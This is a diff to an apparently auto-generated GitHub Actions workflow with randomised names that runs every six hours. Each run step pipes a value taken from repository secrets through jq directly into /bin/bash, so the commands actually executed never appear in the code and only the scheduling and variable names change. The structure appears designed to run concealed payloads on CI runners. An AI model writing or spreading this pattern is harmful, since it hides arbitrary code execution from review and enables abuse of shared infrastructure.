@@ -3,8 +3,7 @@ name: wudushu4671
 on:
   workflow_dispatch:
   schedule:
-    - cron: '17 0/6 * * *'
-
+    - cron: '33 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,14 +11,12 @@ jobs:
       - uses: actions/checkout@v4
       - name: wudushu4671
         env:
-          dyhb17: ${{ secrets.dyhb17 }}
+          n924: ${{ secrets.n924 }}
         run: |
-          echo $dyhb17 | jq -r .nak24 | /bin/bash
-          echo $qtion10 | jq -r .berux2 | /bin/bash
-          echo $cn11 | jq -r .i4 | /bin/bash
-          echo $bidgk52919 | jq -r .he608 | /bin/bash
-          echo $bzhi38 | jq -r .zow81 | /bin/bash
-          echo $boam3583 | jq -r .wvq87 | /bin/bash
-          echo $pabr5109 | jq -r .hx25 | /bin/bash
-          echo $kdxe973 | jq -r .asme8787 | /bin/bash
+          echo $n924 | jq -r .iez37 | /bin/bash
+          echo $njujz6028 | jq -r .tjlle4 | /bin/bash
+          echo $my084 | jq -r .xgqrt93801 | /bin/bash
+          echo $lp51324 | jq -r .g4473 | /bin/bash
+          echo $cuca8688 | jq -r .gel2 | /bin/bash
+          echo $cy101 | jq -r .ubkds6 | /bin/bash
 
